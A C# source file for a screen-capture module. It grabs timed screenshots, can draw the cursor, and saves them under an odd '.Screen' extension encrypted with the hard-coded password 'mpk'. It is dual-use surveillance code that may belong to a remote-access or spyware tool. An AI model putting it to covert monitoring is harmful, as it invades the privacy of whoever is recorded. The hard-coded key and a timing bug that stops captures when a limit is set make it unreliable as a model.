using Microsoft.VisualBasic.Devices;
using Module_Screen_Capture.Response;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace Module_Screen_Capture
{
    public class Module_Screen_Capture
    {
        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        const Int32 CURSOR_SHOWING = 0x00000001;

        Computer mycomputer;
        Size ScreenSize;
        public Module_Screen_Capture()
        {
            mycomputer = new Computer();
            ScreenSize = new Size(mycomputer.Screen.Bounds.Width, mycomputer.Screen.Bounds.Height);
            ResizeTo = ScreenSize;
            ElapsTimeInMiliSec = 1000;
        }
        public OnUpdateLocalScreenSizeResponse OnUpdateLocalScreenSize()
        {
            OnUpdateLocalScreenSizeResponse ROnUpdateLocalScreenSizeResponse = new OnUpdateLocalScreenSizeResponse();
            try
            {
                ROnUpdateLocalScreenSizeResponse.Description = "Screen capture New Screen updated Set To Width="+ mycomputer.Screen.Bounds.Width+ "And Height="+mycomputer.Screen.Bounds.Height + "\r\n";
                ScreenSize = new Size(mycomputer.Screen.Bounds.Width, mycomputer.Screen.Bounds.Height);
            }
            catch (Exception ex)
            {
                ROnUpdateLocalScreenSizeResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
            return ROnUpdateLocalScreenSizeResponse;
        }
        public OnUpdateReziseToResponse OnUpdateReziseTo(Size ReSize)
        {
            OnUpdateReziseToResponse ROnUpdateReziseToResponse = new OnUpdateReziseToResponse();
            try
            {
                ROnUpdateReziseToResponse.Description = "Screen capture New Captured imageSize Updated \r\n";
                ROnUpdateReziseToResponse.ReSizeTo = ReSize;
                ResizeTo = ReSize;
            }
            catch (Exception ex)
            {
                ROnUpdateReziseToResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
            return ROnUpdateReziseToResponse;
        }
        public Size ResizeTo {get; set;}
        public bool CaptureMouse { get; set; }
        public int ElapsTimeInMiliSec { get; set; }
        public int MaxMinuteLimit { get; set; }
        private Timer StopTimer;
        private DateTime EndTime;
        public OnStartScreenCaptureResponse OnStartScreenCapture()
        {
            OnStartScreenCaptureResponse ROnStartScreenCaptureResponse = new OnStartScreenCaptureResponse();
            try
            {
                ROnStartScreenCaptureResponse.Description = "Screen capture started\r\n";
                Directory.CreateDirectory("captures");
                if (MaxMinuteLimit > 0)
                    EndTime = DateTime.Now.AddMinutes(MaxMinuteLimit);
                StopTimer = new System.Timers.Timer();
                StopTimer.Interval = ElapsTimeInMiliSec;
                StopTimer.Elapsed += StopTimer_Elapsed;
                StopTimer.Enabled = true;
            }
            catch (Exception ex)
            {
                ROnStartScreenCaptureResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
            return ROnStartScreenCaptureResponse;
        }
        public OnStopscreenCaptureResponse OnStopscreenCapture()
        {
            OnStopscreenCaptureResponse ROnStopscreenCaptureResponse = new OnStopscreenCaptureResponse();
            try
            {
                ROnStopscreenCaptureResponse.Description = "Screen capture stoped\r\n";
                StopTimer.Stop();
            }
            catch (Exception ex)
            {
                ROnStopscreenCaptureResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
            return ROnStopscreenCaptureResponse;
        }

        private void StopTimer_Elapsed(object sender, ElapsedEventArgs e)
        {

                if (MaxMinuteLimit > 0)
                {
                    if (CheckTime())
                    {
                        StopTimer.Stop();
                    }
                }
                else
                {
                Bitmap screenGrab = new Bitmap(mycomputer.Screen.Bounds.Width, mycomputer.Screen.Bounds.Height);
                Graphics graphics = System.Drawing.Graphics.FromImage(screenGrab);
                graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), ScreenSize);
                if (ScreenSize != ResizeTo)
                {
                    screenGrab = new Bitmap(screenGrab, ResizeTo.Width, ResizeTo.Height); //Defines the new image size
                }

                if (CaptureMouse)
                {
                    CURSORINFO pci;
                    pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));

                    if (GetCursorInfo(out pci))
                    {
                        if (pci.flags == CURSOR_SHOWING)
                        {
                            DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                            graphics.ReleaseHdc();
                        }
                    }
                }
                string Filename = "captures\\" + DateTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".Screen";
                screenGrab.Save(Filename, System.Drawing.Imaging.ImageFormat.Jpeg);
                Utils._S_Utils_Crypto suc = new Utils._S_Utils_Crypto();
                suc.EncryptFile(Filename, Filename + "AES", "mpk", suc.salt, 1);
                File.Delete(Filename);
                //not set max size or max time
                //stop recording manualy
            }
        }
        private bool CheckTime()
        {
            DateTime NowTime = DateTime.Now;
            if (DateTime.Now.CompareTo(EndTime) >= 0)
            {

                return true;
            }
            return false;
        }
    }
}
